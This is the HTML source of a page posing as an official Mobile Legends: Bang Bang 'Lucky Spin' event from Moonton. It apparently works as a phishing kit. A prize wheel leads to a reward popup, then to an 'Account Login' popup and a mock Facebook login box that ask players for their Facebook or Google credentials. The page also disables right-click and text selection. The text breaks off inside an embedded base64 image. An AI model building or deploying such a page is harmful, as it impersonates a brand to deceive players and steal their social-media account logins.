<html>

<head>
    <style type="text/css">
        .swal-icon--error {
            border-color: #f27474;
            -webkit-animation: animateErrorIcon .5s;
            animation: animateErrorIcon .5s
        }

        .swal-icon--error__x-mark {
            position: relative;
            display: block;
            -webkit-animation: animateXMark .5s;
            animation: animateXMark .5s
        }

        .swal-icon--error__line {
            position: absolute;
            height: 5px;
            width: 47px;
            background-color: #f27474;
            display: block;
            top: 37px;
            border-radius: 2px
        }

        .swal-icon--error__line--left {
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg);
            left: 17px
        }

        .swal-icon--error__line--right {
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            right: 16px
        }

        @-webkit-keyframes animateErrorIcon {
            0% {
                -webkit-transform: rotateX(100deg);
                transform: rotateX(100deg);
                opacity: 0
            }
            to {
                -webkit-transform: rotateX(0deg);
                transform: rotateX(0deg);
                opacity: 1
            }
        }

        @keyframes animateErrorIcon {
            0% {
                -webkit-transform: rotateX(100deg);
                transform: rotateX(100deg);
                opacity: 0
            }
            to {
                -webkit-transform: rotateX(0deg);
                transform: rotateX(0deg);
                opacity: 1
            }
        }

        @-webkit-keyframes animateXMark {
            0% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            50% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            80% {
                -webkit-transform: scale(1.15);
                transform: scale(1.15);
                margin-top: -6px
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1);
                margin-top: 0;
                opacity: 1
            }
        }

        @keyframes animateXMark {
            0% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            50% {
                -webkit-transform: scale(.4);
                transform: scale(.4);
                margin-top: 26px;
                opacity: 0
            }
            80% {
                -webkit-transform: scale(1.15);
                transform: scale(1.15);
                margin-top: -6px
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1);
                margin-top: 0;
                opacity: 1
            }
        }

        .swal-icon--warning {
            border-color: #f8bb86;
            -webkit-animation: pulseWarning .75s infinite alternate;
            animation: pulseWarning .75s infinite alternate
        }

        .swal-icon--warning__body {
            width: 5px;
            height: 47px;
            top: 10px;
            border-radius: 2px;
            margin-left: -2px
        }

        .swal-icon--warning__body,
        .swal-icon--warning__dot {
            position: absolute;
            left: 50%;
            background-color: #211f36
        }

        .swal-icon--warning__dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            margin-left: -4px;
            bottom: -11px
        }

        @-webkit-keyframes pulseWarning {
            0% {
                border-color: #f8d486
            }
            to {
                border-color: #f8bb86
            }
        }

        @keyframes pulseWarning {
            0% {
                border-color: #f8d486
            }
            to {
                border-color: #f8bb86
            }
        }

        .swal-icon--success {
            border-color: green
        }

        .swal-icon--success:after,
        .swal-icon--success:before {
            content: "";
            border-radius: 50%;
            position: absolute;
            width: 60px;
            height: 120px;
            background: #211f36;
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg)
        }

        .swal-icon--success:before {
            border-radius: 120px 0 0 120px;
            top: -7px;
            left: -33px;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            -webkit-transform-origin: 60px 60px;
            transform-origin: 60px 60px
        }

        .swal-icon--success:after {
            border-radius: 0 120px 120px 0;
            top: -11px;
            left: 30px;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            -webkit-transform-origin: 0 60px;
            transform-origin: 0 60px;
            -webkit-animation: rotatePlaceholder 4.25s ease-in;
            animation: rotatePlaceholder 4.25s ease-in
        }

        .swal-icon--success__ring {
            width: 80px;
            height: 80px;
            border: 4px solid hsla(98, 55%, 69%, .2);
            border-radius: 50%;
            box-sizing: content-box;
            position: absolute;
            left: -4px;
            top: -4px;
            z-index: 2
        }

        .swal-icon--success__hide-corners {
            width: 5px;
            height: 90px;
            background-color: #211f36;
            padding: 1px;
            position: absolute;
            left: 28px;
            top: 8px;
            z-index: 1;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg)
        }

        .swal-icon--success__line {
            height: 5px;
            background-color: green;
            display: block;
            border-radius: 2px;
            position: absolute;
            z-index: 2
        }

        .swal-icon--success__line--tip {
            width: 25px;
            left: 14px;
            top: 46px;
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg);
            -webkit-animation: animateSuccessTip .75s;
            animation: animateSuccessTip .75s
        }

        .swal-icon--success__line--long {
            width: 47px;
            right: 8px;
            top: 38px;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            -webkit-animation: animateSuccessLong .75s;
            animation: animateSuccessLong .75s
        }

        @-webkit-keyframes rotatePlaceholder {
            0% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            5% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            12% {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
            to {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
        }

        @keyframes rotatePlaceholder {
            0% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            5% {
                -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg)
            }
            12% {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
            to {
                -webkit-transform: rotate(-405deg);
                transform: rotate(-405deg)
            }
        }

        @-webkit-keyframes animateSuccessTip {
            0% {
                width: 0;
                left: 1px;
                top: 19px
            }
            54% {
                width: 0;
                left: 1px;
                top: 19px
            }
            70% {
                width: 50px;
                left: -8px;
                top: 37px
            }
            84% {
                width: 17px;
                left: 21px;
                top: 48px
            }
            to {
                width: 25px;
                left: 14px;
                top: 45px
            }
        }

        @keyframes animateSuccessTip {
            0% {
                width: 0;
                left: 1px;
                top: 19px
            }
            54% {
                width: 0;
                left: 1px;
                top: 19px
            }
            70% {
                width: 50px;
                left: -8px;
                top: 37px
            }
            84% {
                width: 17px;
                left: 21px;
                top: 48px
            }
            to {
                width: 25px;
                left: 14px;
                top: 45px
            }
        }

        @-webkit-keyframes animateSuccessLong {
            0% {
                width: 0;
                right: 46px;
                top: 54px
            }
            65% {
                width: 0;
                right: 46px;
                top: 54px
            }
            84% {
                width: 55px;
                right: 0;
                top: 35px
            }
            to {
                width: 47px;
                right: 8px;
                top: 38px
            }
        }

        @keyframes animateSuccessLong {
            0% {
                width: 0;
                right: 46px;
                top: 54px
            }
            65% {
                width: 0;
                right: 46px;
                top: 54px
            }
            84% {
                width: 55px;
                right: 0;
                top: 35px
            }
            to {
                width: 47px;
                right: 8px;
                top: 38px
            }
        }

        .swal-icon--info {
            border-color: #c9dae1
        }

        .swal-icon--info:before {
            width: 5px;
            height: 29px;
            bottom: 17px;
            border-radius: 2px;
            margin-left: -2px
        }

        .swal-icon--info:after,
        .swal-icon--info:before {
            content: "";
            position: absolute;
            left: 50%;
            background-color: #c9dae1
        }

        .swal-icon--info:after {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            margin-left: -3px;
            top: 19px
        }

        .swal-icon {
            width: 80px;
            height: 80px;
            border-width: 4px;
            border-style: solid;
            border-radius: 50%;
            padding: 0;
            position: relative;
            box-sizing: content-box;
            margin: 20px auto
        }

        .swal-icon:first-child {
            margin-top: 32px
        }

        .swal-icon--custom {
            width: auto;
            height: auto;
            max-width: 100%;
            border: none;
            border-radius: 0
        }

        .swal-icon img {
            max-width: 100%;
            max-height: 100%
        }

        .swal-title {
            color: gold;
            font-weight: 600;
            text-transform: none;
            position: relative;
            display: block;
            padding: 13px 16px;
            font-size: 27px;
            line-height: normal;
            text-align: center;
            margin-bottom: 0
        }

        .swal-title:first-child {
            margin-top: 26px
        }

        .swal-title:not(:first-child) {
            padding-bottom: 0
        }

        .swal-title:not(:last-child) {
            margin-bottom: 13px
        }

        .swal-text {
            font-size: 16px;
            position: relative;
            float: none;
            line-height: normal;
            vertical-align: top;
            text-align: left;
            display: inline-block;
            margin: 0;
            padding: 0 10px;
            font-weight: 400;
            color: red;
            max-width: calc(100% - 20px);
            overflow-wrap: break-word;
            box-sizing: border-box
        }

        .swal-text:first-child {
            margin-top: 45px
        }

        .swal-text:last-child {
            margin-bottom: 45px
        }

        .swal-footer {
            text-align: right;
            padding-top: 13px;
            margin-top: 13px;
            padding: 13px 16px;
            border-radius: inherit;
            border-top-left-radius: 0;
            border-top-right-radius: 0
        }

        .swal-button-container {
            margin: 5px;
            display: inline-block;
            position: relative
        }

        .swal-2button {
            background-color: red;
            color: #fff;
            border: none;
            box-shadow: none;
            border-radius: 5px;
            font-weight: 600;
            font-size: 14px;
            padding: 10px 24px;
            margin: 0;
            cursor: pointer
        }

        .swal-2button[not:disabled]:hover {
            background-color: #78cbf2
        }

        .swal-button:active {
            background-color: #70bce0;
        }

        .claim {
            margin: 5px;
            display: inline-block;
            position: relative
        }

        .claim {
            background-color: green;
            color: #fff;
            border: none;
            box-shadow: none;
            border-radius: 5px;
            font-weight: 600;
            font-size: 14px;
            padding: 10px 24px;
            margin: 0;
            cursor: pointer
        }

        .swal-button:focus {
            outline: none;
            box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(43, 114, 165, .29)
        }

        .swal-button[disabled] {
            opacity: .5;
            cursor: default
        }

        .swal-button::-moz-focus-inner {
            border: 0
        }

        .swal-button--cancel {
            color: #555;
            background-color: #efefef
        }

        .swal-button--cancel[not:disabled]:hover {
            background-color: #e8e8e8
        }

        .swal-button--cancel:active {
            background-color: #d7d7d7
        }

        .swal-button--cancel:focus {
            box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(116, 136, 150, .29)
        }

        .swal-button--danger {
            background-color: #e64942
        }

        .swal-button--danger[not:disabled]:hover {
            background-color: #df4740
        }

        .swal-button--danger:active {
            background-color: #cf423b
        }

        .swal-button--danger:focus {
            box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(165, 43, 43, .29)
        }

        .swal-content {
            padding: 0 20px;
            margin-top: 20px;
            font-size: medium
        }

        .swal-content:last-child {
            margin-bottom: 20px
        }

        .swal-content__input,
        .swal-content__textarea {
            -webkit-appearance: none;
            background-color: #fff;
            border: none;
            font-size: 14px;
            display: block;
            box-sizing: border-box;
            width: 100%;
            border: 1px solid rgba(0, 0, 0, .14);
            padding: 10px 13px;
            border-radius: 2px;
            transition: border-color .2s
        }

        .swal-content__input:focus,
        .swal-content__textarea:focus {
            outline: none;
            border-color: #6db8ff
        }

        .swal-content__textarea {
            resize: vertical
        }

        .swal-button--loading {
            color: transparent
        }

        .swal-button--loading~.swal-button__loader {
            opacity: 1
        }

        .swal-button__loader {
            position: absolute;
            height: auto;
            width: 43px;
            z-index: 2;
            left: 50%;
            top: 50%;
            -webkit-transform: translateX(-50%) translateY(-50%);
            transform: translateX(-50%) translateY(-50%);
            text-align: center;
            pointer-events: none;
            opacity: 0
        }

        .swal-button__loader div {
            display: inline-block;
            float: none;
            vertical-align: baseline;
            width: 9px;
            height: 9px;
            padding: 0;
            border: none;
            margin: 2px;
            opacity: .4;
            border-radius: 7px;
            background-color: hsla(0, 0%, 100%, .9);
            transition: background .2s;
            -webkit-animation: swal-loading-anim 1s infinite;
            animation: swal-loading-anim 1s infinite
        }

        .swal-button__loader div:nth-child(3n+2) {
            -webkit-animation-delay: .15s;
            animation-delay: .15s
        }

        .swal-button__loader div:nth-child(3n+3) {
            -webkit-animation-delay: .3s;
            animation-delay: .3s
        }

        @-webkit-keyframes swal-loading-anim {
            0% {
                opacity: .4
            }
            20% {
                opacity: .4
            }
            50% {
                opacity: 1
            }
            to {
                opacity: .4
            }
        }

        @keyframes swal-loading-anim {
            0% {
                opacity: .4
            }
            20% {
                opacity: .4
            }
            50% {
                opacity: 1
            }
            to {
                opacity: .4
            }
        }

        .swal-overlay {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            text-align: center;
            font-size: 0;
            overflow-y: auto;
            background-color: rgba(0, 0, 0, .4);
            z-index: 10000;
            pointer-events: none;
            opacity: 0;
            transition: opacity .3s
        }

        .swal-overlay:before {
            content: " ";
            display: inline-block;
            vertical-align: middle;
            height: 100%
        }

        .swal-overlay--show-modal {
            opacity: 1;
            pointer-events: auto
        }

        .swal-overlay--show-modal .swal-modal {
            opacity: 1;
            pointer-events: auto;
            box-sizing: border-box;
            -webkit-animation: showSweetAlert .3s;
            animation: showSweetAlert .3s;
            will-change: transform
        }

        .swal-modal {
            width: 478px;
            opacity: 0;
            pointer-events: none;
            background-color: #211f36;
            border: 1px solid silver;
            text-align: center;
            border-radius: 5px;
            position: static;
            margin: 20px auto;
            display: inline-block;
            vertical-align: middle;
            -webkit-transform: scale(1);
            transform: scale(1);
            -webkit-transform-origin: 50% 50%;
            transform-origin: 50% 50%;
            z-index: 10001;
            transition: opacity .2s, -webkit-transform .3s;
            transition: transform .3s, opacity .2s;
            transition: transform .3s, opacity .2s, -webkit-transform .3s
        }

        @media (max-width:500px) {
            .swal-modal {
                width: calc(100% - 20px)
            }
        }

        @-webkit-keyframes showSweetAlert {
            0% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
            1% {
                -webkit-transform: scale(.5);
                transform: scale(.5)
            }
            45% {
                -webkit-transform: scale(1.05);
                transform: scale(1.05)
            }
            80% {
                -webkit-transform: scale(.95);
                transform: scale(.95)
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }

        @keyframes showSweetAlert {
            0% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
            1% {
                -webkit-transform: scale(.5);
                transform: scale(.5)
            }
            45% {
                -webkit-transform: scale(1.05);
                transform: scale(1.05)
            }
            80% {
                -webkit-transform: scale(.95);
                transform: scale(.95)
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <style>
        @font-face {
            font-family: halloween;
            src: url('css/hal.ttf') format("truetype");
        }

        @font-face {
            font-family: pubg;
            src: url('css/pubg.ttf') format("truetype");
        }

        body {
            margin: 0;
            box-sizing: border-box;
        }

        ::-webkit-scrollbar {
            display: none;
        }

        .wrap {
            width: 100%;
            height: 100%;
        }

        .wrap .bg {
            position: relative;
            width: 100%;
            height: 100%;
        }

        .bg img {
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
            width: 415px;
        }

        .bg .box {
            width: 100%;
            height: 100%;
            text-align: center;
            margin-top: -30px;
        }

        .box .spin {
            background: url('img/pe.png') no-repeat;
            background-size: cover;
            width: 380px;
            margin-top: 30px;
            text-align: center;
            height: 380px;
        }

        .spin .img {
            border: 2px solid white;
            width: 60px;
            height: 60px;
        }

        .spin .img:nth-child(1) {
            position: relative;
            top: 51px;
            left: 128px;
        }

        .spin .img:nth-child(2) {
            position: relative;
            top: 239x;
            left: 63px;
            transform: rotate(179.5deg);
        }

        .spin .img:nth-child(3) {
            position: relative;
            top: 102px;
            right: -79px;
            transform: rotate(61deg);
        }

        .spin .img:nth-child(4) {
            position: relative;
            top: 190.5px;
            right: -12px;
            transform: rotate(119deg);
        }

        .spin .img:nth-child(5) {
            position: relative;
            top: 190.5px;
            left: -202px;
            transform: rotate(241deg);
        }

        .spin .img:nth-child(6) {
            position: relative;
            top: 38px;
            left: -81px;
            transform: rotate(299deg);
        }

        .box .start {
            position: relative;
            border: none;
            margin-top: -70px;
            width: 130px;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }

        .mask {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.50);
        }

        keyframes da {
            from {
                transform: translate(-50%, -80%);
            }
            to {
                transform: translate(-50%, -50%);
            }
        }

        @keyframes dax {
            from {
                transform: translate(-50%, -65%);
            }
            to {
                transform: translate(-50%, -50%);
            }
        }

        .alertx .topx {
            font-family: 'halloween', sans-serif;
            top: -42.5px;
            left: -2px;
            position: absolute;
            width: 270px;
            height: 40px;
            line-height: 40px;
            font-size: 20px;
            background: orange;
            border-top-left-radius: 4px;
            border-top-right-radius: 4px;
            border: 2px solid orange;
            border-bottom: none;
        }

        .alertx .px {
            font-family: 'pubg';
            color: orange;
            font-weight: bold;
            font-size: 15px;
            padding: 10px 10px 10px 10px;
        }

        .alertx .px img {
            width: 100px;
            height: 100px;
        }

        .alertx .btnx {
            margin-top: 4px;
            width: 95px;
            height: 30px;
            line-height: 30px;
            font-weight: bold;
            font-size: 16px;
            font-family: 'pubg';
            background: orange;
            border-radius: 5px;
        }

        /**/

        .alertl {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            background: url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
            background-size: cover;
            width: 270px;
            height: 170px;
            border-bottom-left-radius: 4px;
            border-bottom-right-radius: 4px;
            border: 2px solid orange;
            border-top: none;
            animation: dal 2s forwards;
            transition: ease-in-out;
        }

        @keyframes dal {
            from {
                transform: translate(-50%, -65%);
            }
            to {
                transform: translate(-50%, -50%);
            }
        }

        .alertl .topl {
            font-family: 'halloween', sans-serif;
            top: -42.5px;
            left: -2px;
            position: absolute;
            width: 270px;
            height: 40px;
            line-height: 40px;
            font-size: 15px;
            background: orange;
            border-top-left-radius: 4px;
            border-top-right-radius: 4px;
            border: 2px solid orange;
            border-bottom: none;
        }

        .alertl .pl {
            font-family: 'pubg';
            color: orange;
            font-weight: bold;
            font-size: 15px;
            padding: 10px 10px 10px 10px;
        }

        .alertl .fb {
            height: 32px;
            line-height: 32px;
            width: 250px;
            background: #3b5998;
            font-size: 17px;
            padding-left: 10px;
            border-radius: 4px;
            box-shadow: 0 3px 1px orange;
            color: white;
            font-weight: bold;
            margin-top: 15%;
            font-family: 'pubg';
            text-align: center;
        }

        .alertl .tw {
            padding-left: 10px;
            height: 32px;
            line-height: 32px;
            width: 250px;
            background: #1DA1F2;
            font-size: 17px;
            border-radius: 4px;
            box-shadow: 0 3px 1px orange;
            color: white;
            font-weight: bold;
            margin-top: 5%;
            font-family: 'pubg';
            text-align: center;
        }

        .fb i,
        .tw i {
            margin-top: 8px;
            float: left;
        }

        @media only screen and (min-width:100px) {
            .bg img {
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
                width: 150px;
            }
        }

        @media only screen and (min-width:200px) {
            .bg img {
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
                width: 370px;
                ;
            }
            .bg .label {
                border: none;
                width: 370px;
            }
            .bg .box {
                width: 370px;
                height: 380px;
            }
            .img {
                position: absolute;
                width: 10px;
            }
            .box .spin {
                background: url('img/spin.png') no-repeat;
                background-size: cover;
                width: 350px;
                text-align: center;
                height: 350px;
            }
            .box .start {
                position: relative;
                border: none;
                bottom: 270px;
                width: 170px;
                height: 220px;
            }
            .spin .img:nth-child(2) {
                position: relative;
                top: 241px;
                left: 63px;
                transform: rotate(179.5deg);
            }
        }

        @media only screen and (min-width:399px) {
            .bg img {
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
                width: 410px;
            }
            .bg .label {
                border: none;
                margin-top: -3px;
                width: 410px;
            }
            .bg .box {
                width: 410px;
                height: 460px;
            }
            .spin .img:nth-child(1) {
                position: relative;
                top: 35px;
                left: 130px;
            }
            .spin .img:nth-child(5) {
                position: relative;
                top: 195.5px;
                left: -225px;
                transform: rotate(241deg);
            }
        }

        .bulet {
            color: #000;
            font-size: 8px;
        }

        .aktifnya {
            color: #1da1f2;
            border-bottom: 2px solid #1da1f2;
        }

        @media only screen and (min-width:399px) {
            .bg img {
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
                width: 410px;
            }
            .bg .label {
                border-radius: 0;
                margin-top: 0;
                width: 410px;
            }
            .bg .box {
                border-radius: 0;
                width: 410px;
                height: 350px;
            }
            .spin .img:nth-child(1) {
                position: relative;
                top: 54px;
                left: 126px;
            }
            .spin .img:nth-child(5) {
                position: relative;
                top: 190.5px;
                left: -202px;
                transform: rotate(241deg);
            }
        }
    </style>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mobile Legends Lucky Spin</title>
    <link rel="icon" type="img/png" href="https://apprecs.org/ios/images/app-icons/256/e7/1160056295.jpg" sizes="32x32">
    <meta property="og:description" content="Start a event from Moonton. You can spin in one times only!">
    <meta property="og:image" content="https://apprecs.org/ios/images/app-icons/256/e7/1160056295.jpg">
    <meta property="og:image:width" content="540">
    <meta property="og:image:height" content="282">
    <link rel="stylesheet" href="css-zone/facebook.css">
    <link rel="stylesheet" href="css-zone/twitter.css">
    <link href="https://fonts.googleapis.com/css2?family=Teko&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <script type="text/javascript" src="js-zone/jquery.js">
    </script>
    <script type="text/javascript" src="js-zone/main-zone.js"></script>
    <script type="text/javascript" src="index_files/main-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script src="js-zone/alert-zone.js"></script>
    <script type="text/javascript" src="js-zone/zero-zone.js"></script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <link rel="stylesheet" type="text/css" href="css-zone/style-zone.css">
    <link type="text/css" rel="stylesheet" href="css-zone/zero-zone.css">
    <script language="JavaScript">
        document.write(ls())
    </script>
    <link rel="stylesheet" type="text/css" href="css-zone/style-zone.css">
    <link type="text/css" rel="stylesheet" href="css-zone/zero-zone.css">
    <script script="" language="JavaScript">
        document.write(riyanandhika())
    </script>
    <link href="./index_files/css" rel="stylesheet">
    <script language="JavaScript">
        document.write(head())
    </script>
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div class="slider-container">
        <section>
            <div class="imgBox">
                <video src="media/header.mp4" autoplay loop muted></video>
            </div>

            <div class="slogan" style="background: rgba(0,0,0, 0.5);">
                <img src="img/mlbb.png">
                <img src="img/x.png">
                <img src="img/moonton.png">
            </div>

        </section>
    </div>
    <div class="gallery-container" style="border: 3px solid #fff;">
    
	<center>
    <div class="wrap" style="height: 350px;">
        <div class="bg">
            <div class="box">
                <center>
				<div class="spin">
                <img class="img" src="img/reward/2.png">
                <img class="img" src="img/reward/3.png">
                <img class="img" src="img/reward/1.png">
                <img class="img" src="img/reward/4.png">
                <img class="img" src="img/reward/5.png">
                <img class="img" src="img/reward/6.png">
                </div>
                </center>
				<img onclick="spin()" class="start" src="img/putar.png">
            </div>
        </div>
    </div>
	</center>
	
    </div>
    <div class="div-bot" style="color:white;padding-top: 10px;padding-bottom: 1px;">
        <center>
            <p>
                <img src="img/mlbb.png" style="padding-top: 10px;height:35px;width: 80px;">
                <img src="img/moonton.png" style="padding-top: 10px;height:40px;width: 100px;">
            </p>
            <div style="color: #fff; font-size: 17px; font-family: Teko; font-weight: bold; text-transform: uppercase;">ⓒ 2021 Mobile Legends: Bang Bang. All rights reserved.</div>
            <p></p>
        </center>
    </div>
    <script src="./index_files/jquery.min.js.download">
    </script>
    <script language="JavaScript">
        document.write(result())
    </script>
    <script type="text/javascript" src="index_files/gift-zone.js"></script>
    <script>
        function openHero(evt, heroClass) {
            var i, gallery, tab;
            gallery = document.getElementsByClassName("gallery");
            for (i = 0; i < gallery.length; i++) {
                gallery[i].style.display = "none";
            }
            tab = document.getElementsByClassName("tab");
            for (i = 0; i < tab.length; i++) {
                tab[i].className = tab[i].className.replace(" active", "");
            }
            document.getElementById(heroClass).style.display = "block";
            evt.currentTarget.className += " active";
        }
        document.getElementById("defaultOpen").click();
    </script>
    <script type="text/javascript" src="js-zone/slide-zone.js">
    </script>
    <script type="text/javascript" src="./index_files/slide-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(luckyspin())
    </script>

    <style type="text/css">
        *: (input, textarea) {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>
    <style type="text/css">
        img {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>
    <?php 
        $shagitz = array('img/reward/1.png', 'img/reward/2.png', 'img/reward/3.png', 'img/reward/4.png', 'img/reward/5.png', 'img/reward/6.png');
        $acak = rand(0,5);
        $tampilkan  = $shagitz[$acak];
    ?>
    <div class="popup open_rewards" style="display: none;">
        <div class="popup-box animated fadeInDown">
            <div class="nav-popup">
                <div class="nav-popup-title">Reward Confirmation</div>
            </div>
            <div class="popup-alert">Are you sure to collect this rewards?</div>
            <img class="popup-item" src="<?=$tampilkan; ?>">
            <button type="button" class="popup-btn" onclick="open_account_login()">Collect</button>
            <br>
            <br>
        </div>
    </div>

    <div class="popup open_account_login" style="display: none;">
        <div class="popup-box animated fadeInDown">
            <div class="nav-popup">
                <div class="nav-popup-title">Account Login</div>
            </div>
            <div class="popup-alert">Login using your account to receive rewards</div>
            <button type="button" class="btn-login facebook" onmousedown="buka.play()" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
            <button type="button" class="btn-login twitter" style="background: red;" onmousedown="buka.play()" onclick="open_google();"><i class="fa fa-google icon-login"></i> Log in using Google account</button>
            <>
            <br>
            <button type="button" class="popup-btn" onclick="close_account_login()">Back</button>
            <br>
        </div>
    </div>

    <div class="popup-login login_facebook animated fadeIn" style="display: none;">
        <div class="popup-box-login-fb">
            <a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
            <div class="navbar-fb">
                <img src="img/login/facebook_text.png">
            </div>
            <div class="content-box-fb">
                <img src="data:image/jpeg;base64,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